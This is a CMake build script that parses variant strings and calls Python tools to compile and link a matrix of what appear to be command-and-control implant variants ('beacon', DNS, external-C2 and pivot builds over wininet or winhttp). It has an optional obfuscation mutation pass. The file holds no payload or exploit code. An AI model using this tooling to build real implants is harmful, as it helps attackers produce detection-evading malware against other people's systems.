# tools/llvm/CMakeLists.txt — Phase 4: CMake drives the full product variant
# matrix (build.py's CLI retires; its vcxproj parser lives on via
# dump_manifest.py — one parser, two frontends).
#
# Per variant: dump_manifest resolves the vcxproj -> manifest; the
# layout_two_pass driver compiles, links and runs the two-pass layout loop.
#
#   cmake -S tools/llvm -B build/llvm -DREPO=... -DXWIN_DIR=... \
#         -DCLANG_CL=... -DLLD_LINK=... \
#         -DVARIANTS="beacon:x64:wininet:layout;beacon:x64:winhttp:layout;..." \
#         [-DOBF_SO=... -DOBF_SEED=...]
#   cmake --build build/llvm --target all-variants
cmake_minimum_required(VERSION 3.16)
project(beacon_llvm_variants NONE)

set(REPO "" CACHE PATH "repo root")
set(XWIN_DIR "" CACHE PATH "xwin splat")
set(CLANG_CL "" CACHE FILEPATH "clang-cl binary")
set(LLD_LINK "" CACHE FILEPATH "lld-link binary")
set(OBF_SO "" CACHE FILEPATH "mutation pass plugin (optional)")
set(OBF_SEED "1337" CACHE STRING "mutation seed")
set(OUT_DIR "" CACHE PATH "output root (defaults to <binary>/out)")
set(JOBS "3" CACHE STRING "parallel compile jobs")

set(VARIANTS "" CACHE STRING "semicolon list project:platform:http:flags")
if(NOT VARIANTS)
  set(VARIANTS "beacon:x64:wininet:layout;beacon:x64:winhttp:layout;dnsb:x64:wininet:layout;extc2:x64:wininet:layout;pivot:x64:wininet:layout")
endif()

if(NOT REPO OR NOT XWIN_DIR OR NOT CLANG_CL OR NOT LLD_LINK)
  message(FATAL_ERROR "REPO/XWIN_DIR/CLANG_CL/LLD_LINK required")
endif()
if(NOT OUT_DIR)
  set(OUT_DIR "${CMAKE_CURRENT_BINARY_DIR}/out")
endif()
file(MAKE_DIRECTORY "${OUT_DIR}")

set(ALL_TARGETS "")
foreach(V ${VARIANTS})
  string(REPLACE ":" ";" P ${V})
  list(LENGTH P N)
  if(NOT N EQUAL 4)
    message(FATAL_ERROR "variant '${V}' must be project:platform:http:flags")
  endif()
  list(GET P 0 PROJ)
  list(GET P 1 PLAT)
  list(GET P 2 HTTP)
  list(GET P 3 FLAGS)

  set(TNAME "${PROJ}-${PLAT}-${HTTP}-${FLAGS}")
  # "+"-separated token map: layout/plainsleep/noexcreg/diagretaddr/bofwin/pause
  set(MFLAGS "")
  string(REPLACE "+" ";" FTOKS ${FLAGS})
  foreach(T ${FTOKS})
    if(T STREQUAL "layout")
      list(APPEND MFLAGS "--layout")
    elseif(T STREQUAL "plainsleep")
      list(APPEND MFLAGS "--plain-sleep")
    elseif(T STREQUAL "noexcreg")
      list(APPEND MFLAGS "--no-excreg")
    elseif(T STREQUAL "diagretaddr")
      list(APPEND MFLAGS "--diag-retaddr")
    elseif(T STREQUAL "bofwin")
      list(APPEND MFLAGS "--bofwin")
    elseif(T STREQUAL "pause")
      list(APPEND MFLAGS "--pause")
    else()
      message(FATAL_ERROR "unknown variant flag token '${T}' in '${V}'")
    endif()
  endforeach()

  add_custom_target(${TNAME}
    COMMAND ${CMAKE_COMMAND} -E env
            python3 ${CMAKE_CURRENT_SOURCE_DIR}/dump_manifest.py
            --project ${PROJ} --platform ${PLAT} --http ${HTTP} ${MFLAGS}
            --clang-cl ${CLANG_CL} --xwin-dir ${XWIN_DIR} --repo ${REPO}
    COMMAND ${CMAKE_COMMAND} -E env OBF_SEED=${OBF_SEED}
            python3 ${CMAKE_CURRENT_SOURCE_DIR}/layout_two_pass.py
            --manifest ${REPO}/gen/manifest_last.json --repo ${REPO}
            --xwin-dir ${XWIN_DIR} --out-dir "${OUT_DIR}/${TNAME}"
            $<$<BOOL:${OBF_SO}>:--obf=${OBF_SO}> --jobs ${JOBS}
    WORKING_DIRECTORY ${REPO}
    COMMENT "variant ${TNAME}"
    VERBATIM)
  list(APPEND ALL_TARGETS ${TNAME})
endforeach()

add_custom_target(all-variants DEPENDS ${ALL_TARGETS}
  COMMENT "all product variants")
